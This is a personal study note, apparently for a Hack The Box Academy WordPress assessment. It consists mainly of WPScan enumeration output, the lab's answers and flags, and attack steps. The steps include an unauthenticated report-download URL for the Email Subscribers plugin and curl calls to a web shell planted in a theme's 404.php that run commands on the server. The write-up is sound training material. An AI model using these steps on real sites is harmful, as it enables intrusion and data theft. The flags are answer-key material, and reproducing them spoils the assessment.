Project:: HTB
Type:: CBBH
Progress:: Completed
Tags:: 
Sites:: [HTB Academy](https://academy.hackthebox.com/module/17/section/64)
BackLinks:: 
OS related:: 
Walkthrough:: [[Hack The Box] Hacking WordPress - Skill Assessment](https://hoppipolla0507.tistory.com/71)
Note:: 

---
## Identify the WordPress version number.
- `5.1.6`
	- [[WordPress]] [[Enumeration]] : [[WPSCAN]]
		```txt hl:2 ans:59,64
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  15:43:27
		╰─ wpscan --url http://blog.$domain/ -e vp,vt,u -v -o wp_scan_vp_vt_u.txt
		
		╭─ /mn/H/No/CyberVault/Hac/A/B/H/5_Skills Assessment/15_Skills Assessment - WordPress ······· ✔  1m 17s  15:45:10
		╰─ cat wp_scan_vp_vt_u.txt
		_______________________________________________________________
		         __          _______   _____
		         \ \        / /  __ \ / ____|
		          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
		           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
		            \  /\  /  | |     ____) | (__| (_| | | | |
		             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
		
		         WordPress Security Scanner by the WPScan Team
		                         Version 3.8.25
		       Sponsored by Automattic - https://automattic.com/
		       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
		_______________________________________________________________
		
		[+] URL: http://blog.inlanefreight.local/ [10.129.130.69]
		[+] Started: Thu Dec 28 15:43:54 2023
		
		Interesting Finding(s):
		
		[+] Headers
		 | Interesting Entries:
		 |  - Server: Apache/2.4.18 (Ubuntu)
		 |  - X-TEC-API-VERSION: v1
		 |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
		 |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
		 | Found By: Headers (Passive Detection)
		 | Confidence: 100%
		
		[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		 | References:
		 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
		 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
		
		[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 60%
		 | References:
		 |  - https://www.iplocation.net/defend-wordpress-from-ddos
		 |  - https://github.com/wpscanteam/wpscan/issues/1299
		
		[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
		 | Found By: Rss Generator (Passive Detection)
		 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		
		[+] WordPress theme in use: twentynineteen
		 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
		 | Last Updated: 2023-11-07T00:00:00.000Z
		 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
		 | [!] The version is out of date, the latest version is 2.7
		 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
		 | Style Name: Twenty Nineteen
		 | Style URI: https://github.com/WordPress/twentynineteen
		 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom styles for all the default blocks, and is built so that what you see in the editor looks like what you'll see on your website. Twenty Nineteen is designed to be adaptable to a wide range of websites, whether you’re running a photo blog, launching a new business, or supporting a non-profit. Featuring ample whitespace and modern sans-serif headlines paired with classic serif body text, it's built to be beautiful on all screen sizes.
		 | Author: the WordPress team
		 | Author URI: https://wordpress.org/
		 | License: GNU General Public License v2 or later
		 | License URI: LICENSE
		 | Tags: one-column, flexible-header, accessibility-ready, custom-colors, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, rtl-language-support, sticky-post, threaded-comments, translation-ready
		 | Text Domain: twentynineteen
		 |
		 | Found By: Css Style In Homepage (Passive Detection)
		 |
		 | Version: 1.3 (80% confidence)
		 | Found By: Style (Passive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
		
		
		[i] No plugins Found.
		
		
		[i] No themes Found.
		
		
		[i] User(s) Identified:
		
		[+] erika
		 | Found By: Author Posts - Display Name (Passive Detection)
		 | Confirmed By:
		 |  Rss Generator (Passive Detection)
		 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
		 |  Login Error Messages (Aggressive Detection)
		
		[+] admin
		 | Found By: Author Posts - Display Name (Passive Detection)
		 | Confirmed By:
		 |  Rss Generator (Passive Detection)
		 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
		 |  Login Error Messages (Aggressive Detection)
		
		[+] Charlie Wiggins
		 | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
		
		[!] No WPScan API Token given, as a result vulnerability data has not been output.
		[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
		
		[+] Finished: Thu Dec 28 15:45:09 2023
		[+] Requests Done: 665
		[+] Cached Requests: 44
		[+] Data Sent: 188.465 KB
		[+] Data Received: 206.821 KB
		[+] Memory used: 254.906 MB
		[+] Elapsed time: 00:01:15
		
		
		```


---
## Identify the WordPress theme in use.
- `twentynineteen`
	- from above [[WPSCAN]] log

---
## Submit the contents of the flag file in the directory with directory listing enabled.
- `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}`
	- [[WordPress]] [[Enumeration]] : [[WPSCAN]]
		```txt hl:2,48
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  15:43:27
		╰─ wpscan --url http://blog.$domain/ -e vp,vt,u -v -o wp_scan_vp_vt_u.txt
		
		╭─ /mn/H/No/CyberVault/Hac/A/B/H/5_Skills Assessment/15_Skills Assessment - WordPress ······· ✔  1m 17s  15:45:10
		╰─ cat wp_scan_vp_vt_u.txt
		_______________________________________________________________
		         __          _______   _____
		         \ \        / /  __ \ / ____|
		          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
		           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
		            \  /\  /  | |     ____) | (__| (_| | | | |
		             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
		
		         WordPress Security Scanner by the WPScan Team
		                         Version 3.8.25
		       Sponsored by Automattic - https://automattic.com/
		       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
		_______________________________________________________________
		
		[+] URL: http://blog.inlanefreight.local/ [10.129.130.69]
		[+] Started: Thu Dec 28 15:43:54 2023
		
		Interesting Finding(s):
		
		[+] Headers
		 | Interesting Entries:
		 |  - Server: Apache/2.4.18 (Ubuntu)
		 |  - X-TEC-API-VERSION: v1
		 |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
		 |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
		 | Found By: Headers (Passive Detection)
		 | Confidence: 100%
		
		[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		 | References:
		 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
		 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
		
		[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 60%
		 | References:
		 |  - https://www.iplocation.net/defend-wordpress-from-ddos
		 |  - https://github.com/wpscanteam/wpscan/issues/1299
		
		[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
		 | Found By: Rss Generator (Passive Detection)
		 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		
		[+] WordPress theme in use: twentynineteen
		 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
		 | Last Updated: 2023-11-07T00:00:00.000Z
		 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
		 | [!] The version is out of date, the latest version is 2.7
		 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
		 | Style Name: Twenty Nineteen
		 | Style URI: https://github.com/WordPress/twentynineteen
		 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom styles for all the default blocks, and is built so that what you see in the editor looks like what you'll see on your website. Twenty Nineteen is designed to be adaptable to a wide range of websites, whether you’re running a photo blog, launching a new business, or supporting a non-profit. Featuring ample whitespace and modern sans-serif headlines paired with classic serif body text, it's built to be beautiful on all screen sizes.
		 | Author: the WordPress team
		 | Author URI: https://wordpress.org/
		 | License: GNU General Public License v2 or later
		 | License URI: LICENSE
		 | Tags: one-column, flexible-header, accessibility-ready, custom-colors, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, rtl-language-support, sticky-post, threaded-comments, translation-ready
		 | Text Domain: twentynineteen
		 |
		 | Found By: Css Style In Homepage (Passive Detection)
		 |
		 | Version: 1.3 (80% confidence)
		 | Found By: Style (Passive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
		
		
		[i] No plugins Found.
		
		
		[i] No themes Found.
		
		
		[i] User(s) Identified:
		
		[+] erika
		 | Found By: Author Posts - Display Name (Passive Detection)
		 | Confirmed By:
		 |  Rss Generator (Passive Detection)
		 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
		 |  Login Error Messages (Aggressive Detection)
		
		[+] admin
		 | Found By: Author Posts - Display Name (Passive Detection)
		 | Confirmed By:
		 |  Rss Generator (Passive Detection)
		 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
		 |  Login Error Messages (Aggressive Detection)
		
		[+] Charlie Wiggins
		 | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
		
		[!] No WPScan API Token given, as a result vulnerability data has not been output.
		[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
		
		[+] Finished: Thu Dec 28 15:45:09 2023
		[+] Requests Done: 665
		[+] Cached Requests: 44
		[+] Data Sent: 188.465 KB
		[+] Data Received: 206.821 KB
		[+] Memory used: 254.906 MB
		[+] Elapsed time: 00:01:15
		```
	- [[Directory Listing]] : [[curl]] + [[html2text]]
		```txt hl:2,15 ans:16
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  12:13:42
		╰─ curl -s -X GET http://blog.$domain/wp-content/uploads/ | html2text
		****** Index of /wp-content/uploads ******
		[[ICO]]       Name             Last_modified    Size Description
		===========================================================================
		[[PARENTDIR]] Parent_Directory                    -  
		[[DIR]]       2020/            2020-09-08 13:30    -  
		[[DIR]]       2023/            2023-12-29 12:54    -  
		[[DIR]]       siteeditor/      2020-09-08 13:49    -  
		[[TXT]]       upload_flag.txt  2020-09-08 13:56   32  
		===========================================================================
		     Apache/2.4.18 (Ubuntu) Server at blog.inlanefreight.local Port 80
		
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  12:13:50
		╰─ curl -s -X GET http://blog.$domain/wp-content/uploads/upload_flag.txt | html2text
		HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
		```



---
## Identify the only non-admin WordPress user. (Format: `<first-name> <last-name>`)
- `Charlie Wiggins`
	- from above [[WPSCAN]] log


---
## Use a <mark style="background: #FFB86CA6;">vulnerable plugin to download</mark> a file containing a flag value via an <mark style="background: #FFB86CA6;">unauthenticated file download</mark>.
- `HTB{unauTh_d0wn10ad!}`
	- [[Enumeration]] all plugins : [[WPSCAN]]
		```txt hl:2,89,96
		╭─ /mn/H/No/CyberVault/Hac/A/B/H/5_Skills Assessment/15_Skills Assessment - WordPress ·········· ✔  32s  04:02:30
		╰─ wpscan --url http://blog.$domain/ -e ap -v -o wp_scan_ap.txt
		
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  03:46:41
		╰─ cat wp_scan_ap.txt
		_______________________________________________________________
		         __          _______   _____
		         \ \        / /  __ \ / ____|
		          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
		           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
		            \  /\  /  | |     ____) | (__| (_| | | | |
		             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
		
		         WordPress Security Scanner by the WPScan Team
		                         Version 3.8.25
		       Sponsored by Automattic - https://automattic.com/
		       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
		_______________________________________________________________
		
		[+] URL: http://blog.inlanefreight.local/ [10.129.130.69]
		[+] Started: Thu Dec 28 15:42:27 2023
		
		Interesting Finding(s):
		
		[+] Headers
		 | Interesting Entries:
		 |  - Server: Apache/2.4.18 (Ubuntu)
		 |  - X-TEC-API-VERSION: v1
		 |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
		 |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
		 | Found By: Headers (Passive Detection)
		 | Confidence: 100%
		
		[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		 | References:
		 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
		 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
		
		[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 60%
		 | References:
		 |  - https://www.iplocation.net/defend-wordpress-from-ddos
		 |  - https://github.com/wpscanteam/wpscan/issues/1299
		
		[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
		 | Found By: Rss Generator (Passive Detection)
		 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		
		[+] WordPress theme in use: twentynineteen
		 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
		 | Last Updated: 2023-11-07T00:00:00.000Z
		 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
		 | [!] The version is out of date, the latest version is 2.7
		 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
		 | Style Name: Twenty Nineteen
		 | Style URI: https://github.com/WordPress/twentynineteen
		 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom styles for all the default blocks, and is built so that what you see in the editor looks like what you'll see on your website. Twenty Nineteen is designed to be adaptable to a wide range of websites, whether you’re running a photo blog, launching a new business, or supporting a non-profit. Featuring ample whitespace and modern sans-serif headlines paired with classic serif body text, it's built to be beautiful on all screen sizes.
		 | Author: the WordPress team
		 | Author URI: https://wordpress.org/
		 | License: GNU General Public License v2 or later
		 | License URI: LICENSE
		 | Tags: one-column, flexible-header, accessibility-ready, custom-colors, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, rtl-language-support, sticky-post, threaded-comments, translation-ready
		 | Text Domain: twentynineteen
		 |
		 | Found By: Css Style In Homepage (Passive Detection)
		 |
		 | Version: 1.3 (80% confidence)
		 | Found By: Style (Passive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
		
		
		[i] Plugin(s) Identified:
		
		[+] email-subscribers
		 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
		 | Last Updated: 2023-12-19T09:41:00.000Z
		 | [!] The version is out of date, the latest version is 5.7.4
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 |
		 | Version: 4.2.2 (100% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
		
		[+] site-editor
		 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
		 | Latest Version: 1.1.1 (up to date)
		 | Last Updated: 2017-05-02T23:34:00.000Z
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 |
		 | Version: 1.1.1 (80% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
		
		[+] the-events-calendar
		 | Location: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/
		 | Last Updated: 2023-12-14T15:10:00.000Z
		 | [!] The version is out of date, the latest version is 6.2.9
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 |
		 | Version: 5.1.2.1 (80% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
		
		[!] No WPScan API Token given, as a result vulnerability data has not been output.
		[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
		
		[+] Finished: Thu Dec 28 15:43:06 2023
		[+] Requests Done: 38
		[+] Cached Requests: 5
		[+] Data Sent: 10.282 KB
		[+] Data Received: 902.944 KB
		[+] Memory used: 250.672 MB
		[+] Elapsed time: 00:00:38
		
		
		```
		
	- Found [[CVE-2019-19985 WordPress Plugin Email Subscribers]]
		- Goto `http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all`
		- Download [[all-contacts.csv]]
		- Found flag
			```txt ans:4
			╭─ /mn/H/No/CyberVault/Hac/A/B/H/5_Skills Assessment/15_Skills Assessment - WordPress ·········· ✔  32s  04:02:30
			╰─ cat all-contacts.csv
			"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
			"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
			"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
			```


---
## What is the version number of the plugin vulnerable to an LFI?
- `1.1.1`
	- [[Enumeration]] all plugins : [[WPSCAN]]
		```txt hl:2,102,109
		╭─ /mn/H/No/CyberVault/Hac/A/B/H/5_Skills Assessment/15_Skills Assessment - WordPress ·········· ✔  32s  04:02:30
		╰─ wpscan --url http://blog.$domain/ -e ap -v -o wp_scan_ap.txt
		
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  03:46:41
		╰─ cat wp_scan_ap.txt
		_______________________________________________________________
		         __          _______   _____
		         \ \        / /  __ \ / ____|
		          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
		           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
		            \  /\  /  | |     ____) | (__| (_| | | | |
		             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
		
		         WordPress Security Scanner by the WPScan Team
		                         Version 3.8.25
		       Sponsored by Automattic - https://automattic.com/
		       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
		_______________________________________________________________
		
		[+] URL: http://blog.inlanefreight.local/ [10.129.130.69]
		[+] Started: Thu Dec 28 15:42:27 2023
		
		Interesting Finding(s):
		
		[+] Headers
		 | Interesting Entries:
		 |  - Server: Apache/2.4.18 (Ubuntu)
		 |  - X-TEC-API-VERSION: v1
		 |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
		 |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
		 | Found By: Headers (Passive Detection)
		 | Confidence: 100%
		
		[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		 | References:
		 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
		 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
		
		[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 60%
		 | References:
		 |  - https://www.iplocation.net/defend-wordpress-from-ddos
		 |  - https://github.com/wpscanteam/wpscan/issues/1299
		
		[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
		 | Found By: Rss Generator (Passive Detection)
		 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
		
		[+] WordPress theme in use: twentynineteen
		 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
		 | Last Updated: 2023-11-07T00:00:00.000Z
		 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
		 | [!] The version is out of date, the latest version is 2.7
		 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
		 | Style Name: Twenty Nineteen
		 | Style URI: https://github.com/WordPress/twentynineteen
		 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom styles for all the default blocks, and is built so that what you see in the editor looks like what you'll see on your website. Twenty Nineteen is designed to be adaptable to a wide range of websites, whether you’re running a photo blog, launching a new business, or supporting a non-profit. Featuring ample whitespace and modern sans-serif headlines paired with classic serif body text, it's built to be beautiful on all screen sizes.
		 | Author: the WordPress team
		 | Author URI: https://wordpress.org/
		 | License: GNU General Public License v2 or later
		 | License URI: LICENSE
		 | Tags: one-column, flexible-header, accessibility-ready, custom-colors, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, rtl-language-support, sticky-post, threaded-comments, translation-ready
		 | Text Domain: twentynineteen
		 |
		 | Found By: Css Style In Homepage (Passive Detection)
		 |
		 | Version: 1.3 (80% confidence)
		 | Found By: Style (Passive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
		
		
		[i] Plugin(s) Identified:
		
		[+] email-subscribers
		 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
		 | Last Updated: 2023-12-19T09:41:00.000Z
		 | [!] The version is out of date, the latest version is 5.7.4
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 |
		 | Version: 4.2.2 (100% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
		
		[+] site-editor
		 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
		 | Latest Version: 1.1.1 (up to date)
		 | Last Updated: 2017-05-02T23:34:00.000Z
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 |
		 | Version: 1.1.1 (80% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
		
		[+] the-events-calendar
		 | Location: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/
		 | Last Updated: 2023-12-14T15:10:00.000Z
		 | [!] The version is out of date, the latest version is 6.2.9
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 |
		 | Version: 5.1.2.1 (80% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
		
		[!] No WPScan API Token given, as a result vulnerability data has not been output.
		[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
		
		[+] Finished: Thu Dec 28 15:43:06 2023
		[+] Requests Done: 38
		[+] Cached Requests: 5
		[+] Data Sent: 10.282 KB
		[+] Data Received: 902.944 KB
		[+] Memory used: 250.672 MB
		[+] Elapsed time: 00:00:38
		```
		- [[CVE-2018-7422 WordPress Plugin Site Editor 1.1.1]]
		


---
## Use the LFI to identify a system user whose name starts with the letter "f".
- `frank.mclane`
	- ![[Pasted image 20231230011149.png]]


---
## Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.
- `HTB{w0rdPr355_4SS3ssm3n7}`
	- [[13_RCE via the Theme Editor]] : [[RCE]]
		```txt hl:2,3,7 ans:8
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  12:49:10
		╰─ curl -X GET "http://blog.$domain/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/erika/"
		d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
		
		
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  12:49:27
		╰─ curl -X GET "http://blog.$domain/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
		HTB{w0rdPr355_4SS3ssm3n7}
		```


---

```txt hl:2,3,9
╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/5_Skills Assessment/15_Skills Assessment - WordPress · ✔  16:05:32
╰─ curl -s -X GET http://blog.$domain | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/common/src/resources/css/common-skeleton.min.css?ver=4.12.3
http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.12.3
http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/public/css/email-subscribers-public.css
http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/icon-library/fonts/FontAwesome/FontAwesome.css?ver=4.3
http://blog.inlanefreight.local/wp-content/plugins/site-editor/framework/assets/css/general.min.css?ver=1.1.1
http://blog.inlanefreight.local/wp-content/plugins/site-editor/framework/assets/css/animate/animate.min.css?ver=5.1.6
http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/public/js/email-subscribers-public.js
http://blog.inlanefreight.local/wp-content/plugins/site-editor/framework/assets/js/sed_app_site.min.js?ver=1.0.0
http://blog.inlanefreight.local/wp-content/plugins/site-editor/assets/js/livequery/jquery.livequery.min.js?ver=1.0.0
http://blog.inlanefreight.local/wp-content/plugins/site-editor/assets/js/livequery/sed.livequery.min.js?ver=1.0.0
http://blog.inlanefreight.local/wp-content/plugins/site-editor/framework/assets/js/animate/wow.min.js?ver=1.0.2
http://blog.inlanefreight.local/wp-content/plugins/site-editor/framework/assets/js/parallax/jquery.parallax.min.js?ver=1.1.3
http://blog.inlanefreight.local/wp-content/plugins/site-editor/framework/assets/js/render.min.js?ver=1.0.0
http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/common/src/resources/js/underscore-before.js
http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/common/src/resources/js/underscore-after.js
http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/modules/row/js/row.js?ver=1.0.0

```


```txt
/the-events-calendar
